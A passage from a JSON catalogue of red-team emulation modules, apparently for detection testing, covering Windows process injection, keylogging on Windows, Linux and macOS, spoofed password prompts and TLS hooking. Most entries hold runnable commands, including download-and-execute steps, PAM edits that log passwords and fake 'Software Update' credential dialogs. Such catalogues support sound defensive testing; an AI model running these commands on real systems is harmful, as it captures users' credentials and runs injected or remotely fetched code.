      "technique_name": "Thread Execution Hijacking",
      "description": "This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the \"RAGLOX Threat Library\" caption after one or two seconds. ",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToRagloxModulesFolder\\T1055.003\\bin\\InjectContext.exe\"\nStart-Sleep -Seconds 5\nStop-Process $notepad.id",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "578025d5-faa9-4f6d-8390-aae527d503e1",
      "module_name": "Thread Execution Hijacking"
    },
    {
      "index": 302,
      "technique_id": "T1055.004",
      "technique_name": "Process Injection: Asynchronous Procedure Call",
      "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{exe_binary}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "exe_binary",
          "description": "Output Binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055.004\\bin\\T1055.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "#{exe_binary} must be exist on system.\n",
          "check_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055.004/bin/T1055.exe\" -OutFile \"#{exe_binary}\"\n"
        }
      ],
      "rx_module_id": "611b39b7-e243-4c81-87a4-7145a90358b1",
      "module_name": "Process Injection via C#"
    },
    {
      "index": 303,
      "technique_id": "T1055.004",
      "technique_name": "Process Injection: Asynchronous Procedure Call",
      "description": "Creates a process in a suspended state and calls QueueUserAPC WinAPI to add a UserAPC to the child process that points to allocated shellcode. \nResumeThread is called which then calls NtTestAlert to execute the created UserAPC which then executes the shellcode.\nThis technique allows for the early execution of shellcode and potentially before AV/EDR can hook functions to support detection.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)\n- References: \n  - https://www.bleepingcomputer.com/news/security/early-bird-code-injection-technique-helps-malware-stay-undetected/\n  - https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"#{spawn_process_path}\" -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{spawn_process_name}\" -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "spawn_process_path",
          "description": "Path of the binary to spawn",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\werfault.exe"
        },
        {
          "name": "spawn_process_name",
          "description": "Name of the process to spawn",
          "type": "string",
          "default_value": "werfault"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "73785dd2-323b-4205-ab16-bb6f06677e14",
      "module_name": "EarlyBird APC Queue Injection in Go"
    },
    {
      "index": 304,
      "technique_id": "T1055.004",
      "technique_name": "Process Injection: Asynchronous Procedure Call",
      "description": "Uses the undocumented NtQueueAPCThreadEx WinAPI to create a \"Special User APC\" in the current thread of the current process to execute shellcode. \nSince the shellcode is loaded and executed in the current process it is considered local shellcode execution.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Get a handle to the current thread\n5. Execute the shellcode in the current thread by creating a Special User APC through the NtQueueApcThreadEx function\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)\n- References:\n  - https://repnz.github.io/posts/apc/user-apc/\n  - https://docs.rs/ntapi/0.3.1/ntapi/ntpsapi/fn.NtQueueApcThreadEx.html\n  - https://0x00sec.org/t/process-injection-apc-injection/24608\n  - https://twitter.com/aionescu/status/992264290924032005\n  - http://www.opening-windows.com/techart_windows_vista_apc_internals2.htm#_Toc229652505\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4cc571b1-f450-414a-850f-879baf36aa06",
      "module_name": "Remote Process Injection with Go using NtQueueApcThreadEx WinAPI"
    },
    {
      "index": 305,
      "technique_id": "T1055.011",
      "technique_name": "Process Injection: Extra Window Memory Injection",
      "description": "Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "#{exe_binary}",
        "elevation_required": false,
        "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "variables": [
        {
          "name": "arch",
          "description": "Architecture of payload. One of (x64, x86)",
          "type": "string",
          "default_value": "x64"
        },
        {
          "name": "exe_binary",
          "description": "PE binary for EWM injection",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe"
        },
        {
          "name": "payload_file",
          "description": "raw payload to inject",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin"
        }
      ],
      "prerequisites": [
        {
          "description": "T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})",
          "check_command": "if (Test-Path #{exe_binary}) {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory (split-path #{exe_binary}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055.011/bin/T1055.011_#{arch}.exe\" -OutFile \"#{exe_binary}\" -UseBasicParsing\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055.011/bin/payload.exe_#{arch}.bin\" -OutFile \"#{payload_file}\" -UseBasicParsing"
        }
      ],
      "rx_module_id": "93ca40d2-336c-446d-bcef-87f14d438018",
      "module_name": "Process Injection via Extra Window Memory (EWM) x64 executable"
    },
    {
      "index": 306,
      "technique_id": "T1055.012",
      "technique_name": "Process Injection: Process Hollowing",
      "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": ". \"#{script_path}\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "script_download_url",
          "description": "Download url for Start-Hollow.ps1",
          "type": "string",
          "default_value": "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/720d8fe82396faf74f2ca19a3fe99a5c262a14b9/Start-Hollow.ps1"
        },
        {
          "name": "script_path",
          "description": "Path to Start-Hollow.ps1",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055.012\\src\\Start-Hollow.ps1"
        },
        {
          "name": "hollow_binary_path",
          "description": "Path of the binary to hollow (executable that will run inside the sponsor)",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        },
        {
          "name": "parent_process_name",
          "description": "Name of the parent process",
          "type": "string",
          "default_value": "explorer"
        },
        {
          "name": "sponsor_binary_path",
          "description": "Path of the sponsor binary (executable that will host the binary)",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\notepad.exe"
        },
        {
          "name": "spawnto_process_name",
          "description": "Name of the process to spawn",
          "type": "string",
          "default_value": "notepad"
        }
      ],
      "prerequisites": [
        {
          "description": "Start-Hollow.ps1 must be installed\n",
          "check_command": "if (Test-Path \"#{script_path}\") {exit 0} else {exit 1}\n",
          "install_command": "try {\n  iwr \"#{script_download_url}\" -OutFile (New-Item -Path #{script_path} -Force)\n} catch {\n  Write-Error $_\n  Exit 1\n}\n"
        }
      ],
      "rx_module_id": "562427b4-39ef-4e8c-af88-463a78e70b9c",
      "module_name": "Process Hollowing using PowerShell"
    },
    {
      "index": 307,
      "technique_id": "T1055.012",
      "technique_name": "Process Injection: Process Hollowing",
      "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToRagloxModulesFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ms_product",
          "description": "Maldoc application Word",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "3ad4a037-1598-4136-837c-4027e4fa319b",
      "module_name": "RunPE via VBA"
    },
    {
      "index": 308,
      "technique_id": "T1055.012",
      "technique_name": "Process Injection: Process Hollowing",
      "description": "Creates a process in a suspended state, executes shellcode to spawn calc.exe in a child process, and then resumes the original process.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocess)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1055.012\\bin\\x64\\CreateProcess.exe -program \"#{hollow_binary_path}\" -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "hollow_binary_path",
          "description": "Path of the binary to hollow",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\werfault.exe"
        },
        {
          "name": "hollow_process_name",
          "description": "Name of the process to hollow",
          "type": "string",
          "default_value": "werfault"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c8f98fe1-c89b-4c49-a7e3-d60ee4bc2f5a",
      "module_name": "Process Hollowing in Go using CreateProcessW WinAPI"
    },
    {
      "index": 309,
      "technique_id": "T1055.012",
      "technique_name": "Process Injection: Process Hollowing",
      "description": "Create a process in a suspended state, execute shellcode to spawn calc.exe in a child process, and then resume the original process.\nThis test uses the CreatePipe function to create an anonymous pipe that parent and child processes can communicate over. This anonymous pipe\nallows for the retrieval of output generated from executed shellcode.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"#{hollow_binary_path}\" -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "hollow_binary_path",
          "description": "Path of the binary to hollow",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\werfault.exe"
        },
        {
          "name": "hollow_process_name",
          "description": "Name of the process to hollow",
          "type": "string",
          "default_value": "werfault"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "94903cc5-d462-498a-b919-b1e5ab155fee",
      "module_name": "Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012)"
    },
    {
      "index": 310,
      "technique_id": "T1055.015",
      "technique_name": "Process Injection: ListPlanting",
      "description": "This test injects shellcode into a remote RegEdit process using the ListPlanting technique. ListPlanting exploits Window with ListView control. Code write to memory with NtWriteVirtualMemory. The shellcode is executed via PostMessage. When successful, a message box will appear with the title \"Warning\" and the content \"RAGLOX Threat Library\" after a few seconds. Notepad will open following the appearance of the message box.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "elevation_required": true,
        "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "variables": [
        {
          "name": "exe_binary",
          "description": "PE binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1055.015\\bin\\ListPlanting.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Injector ListPlanting.exe must exist at specified location (#{exe_binary})\n",
          "check_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1055.015/bin/ListPlanting.exe\" -OutFile \"#{exe_binary}\"\n"
        }
      ],
      "rx_module_id": "4f3c7502-b111-4dfe-8a6e-529307891a59",
      "module_name": "Process injection ListPlanting"
    },
    {
      "index": 311,
      "technique_id": "T1056.001",
      "technique_name": "Input Capture: Keylogging",
      "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "&\"$PathToRagloxModulesFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "filepath",
          "description": "Name of the local file, include path.",
          "type": "path",
          "default_value": "$env:TEMP\\key.log"
        }
      ],
      "prerequisites": [
        {
          "description": "Get-Keystrokes PowerShell script must exist on disk at PathToRagloxModulesFolder\\T1056.001\\src\\Get-Keystrokes.ps1\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -ItemType Directory (Split-Path \"PathToRagloxModulesFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") -Force | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"PathToRagloxModulesFolder\\T1056.001\\src\\Get-Keystrokes.ps1\"\n"
        }
      ],
      "rx_module_id": "d9b633ca-8efb-45e6-b838-70f595c6ae26",
      "module_name": "Input Capture"
    },
    {
      "index": 312,
      "technique_id": "T1056.001",
      "technique_name": "Input Capture: Keylogging",
      "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/system-auth\n",
        "elevation_required": true,
        "cleanup_command": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Checking if pam_tty_audit.so is installed\n",
          "check_command": "test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'\n",
          "install_command": "echo \"Sorry, you must install module pam_tty_audit.so and recompile, for this test to work\"\n"
        }
      ],
      "rx_module_id": "9c6bdb34-a89f-4b90-acb1-5970614c711b",
      "module_name": "Living off the land Terminal Input Capture on Linux with pam.d"
    },
    {
      "index": 313,
      "technique_id": "T1056.001",
      "technique_name": "Input Capture: Keylogging",
      "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n",
        "elevation_required": true,
        "cleanup_command": "unset PROMPT_COMMAND\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "This test requires to be run in a bash shell and that logger and tee are installed.\n",
          "check_command": "if [ \"$(echo $SHELL)\" != \"/bin/bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v tee)\" ]; then echo -e \"\\n***** tee NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "0e59d59d-3265-4d35-bebd-bf5c1ec40db5",
      "module_name": "Logging bash history to syslog"
    },
    {
      "index": 314,
      "technique_id": "T1056.001",
      "technique_name": "Input Capture: Keylogging",
      "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .shrc or .profile \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "PS2=`logger -t \"$USER\" -f ~/.sh_history`\n$PS2\ntail /var/log/messages\n",
        "elevation_required": true,
        "cleanup_command": "unset PS2\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "This test requires to be run in a bash shell and that logger and tee are installed.\n",
          "check_command": "if [ \"$(echo $SHELL)\" != \"/bin/sh\" ]; then echo -e \"\\n***** sh not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "b04284dc-3bd9-4840-8d21-61b8d31c99f2",
      "module_name": "Logging sh history to syslog/messages"
    },
    {
      "index": 315,
      "technique_id": "T1056.001",
      "technique_name": "Input Capture: Keylogging",
      "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "File to store captured commands",
          "type": "string",
          "default_value": "/tmp/.keyboard.log"
        }
      ],
      "prerequisites": [
        {
          "description": "This test requires to be run in a bash shell\n",
          "check_command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "7f85a946-a0ea-48aa-b6ac-8ff539278258",
      "module_name": "Bash session based keylogger"
    },
    {
      "index": 316,
      "technique_id": "T1056.001",
      "technique_name": "Input Capture: Keylogging",
      "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n",
        "elevation_required": true,
        "cleanup_command": "cp -fv /tmp/sshd /etc/pam.d/\n"
      },
      "variables": [
        {
          "name": "user_account",
          "description": "Basic ssh user account for testing.",
          "type": "string",
          "default_value": "ubuntu"
        }
      ],
      "prerequisites": [
        {
          "description": "This test requires sshd and auditd\n",
          "check_command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "81d7d2ad-d644-4b6a-bea7-28ffe43becca",
      "module_name": "SSHD PAM keylogger"
    },
    {
      "index": 317,
      "technique_id": "T1056.001",
      "technique_name": "Input Capture: Keylogging",
      "description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start now\n",
        "elevation_required": true,
        "cleanup_command": "systemctl restart auditd\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "This test requires sshd and auditd\n",
          "check_command": "if [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "a668edb9-334e-48eb-8c2e-5413a40867af",
      "module_name": "Auditd keylogger"
    },
    {
      "index": 318,
      "technique_id": "T1056.001",
      "technique_name": "Input Capture: Keylogging",
      "description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "swift #{swift_src} -keylog\n",
        "elevation_required": false,
        "cleanup_command": "kill `pgrep swift-frontend`\n"
      },
      "variables": [
        {
          "name": "swift_src",
          "description": "Location of swift script",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1056.001/src/MacOSKeylogger.swift"
        }
      ],
      "prerequisites": [
        {
          "description": "swift script must exist at #{swift_src}, and the terminal must have input monitoring permissions.\n",
          "check_command": "if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "aee3a097-4c5c-4fff-bbd3-0a705867ae29",
      "module_name": "MacOS Swift Keylogger"
    },
    {
      "index": 319,
      "technique_id": "T1056.002",
      "technique_name": "Input Capture: GUI Input Capture",
      "description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "76628574-0bc1-4646-8fe2-8f4427b47d15",
      "module_name": "AppleScript - Prompt User for Password"
    },
    {
      "index": 320,
      "technique_id": "T1056.002",
      "technique_name": "Input Capture: GUI Input Capture",
      "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-RAGLOXTest framework.\nwrite-warning $cred.GetNetworkCredential().Password\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2b162bfd-0928-4d4c-9ec3-4d9f88374b52",
      "module_name": "PowerShell - Prompt User for Password"
    },
    {
      "index": 321,
      "technique_id": "T1056.002",
      "technique_name": "Input Capture: GUI Input Capture",
      "description": "Prompt user for password without requiring permissions to send Apple events to System Settings.\nhttps://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b7037b89-947a-427a-ba29-e7e9f09bc045",
      "module_name": "AppleScript - Spoofing a credential prompt using osascript"
    },
    {
      "index": 322,
      "technique_id": "T1056.004",
      "technique_name": "Input Capture: Credential API Hooking",
      "description": "Hooks functions in PowerShell to read TLS Communications\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"\nInvoke-WebRequest #{server_name} -UseBasicParsing\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_name",
          "description": "Dll To Inject",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1056.004\\bin\\T1056.004x64.dll"
        },
        {
          "name": "server_name",
          "description": "TLS Server To Test Get Request",
          "type": "url",
          "default_value": "https://www.example.com"
        }
      ],
      "prerequisites": [
        {
          "description": "T1056.004x64.dll must exist on disk at specified location (#{file_name})\n",
          "check_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1056.004/bin/T1056.004x64.dll\" -OutFile \"#{file_name}\" -UseBasicParsing\n"
        }
      ],
      "rx_module_id": "de1934ea-1fbf-425b-8795-65fb27dd7e33",
      "module_name": "Hook PowerShell TLS Encrypt/Decrypt Messages"
    },
    {
      "index": 323,
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "ps >> #{output_file}\nps aux >> #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "path of output file",
          "type": "path",
          "default_value": "/tmp/loot.txt"
        }
      ],
      "prerequisites": [],
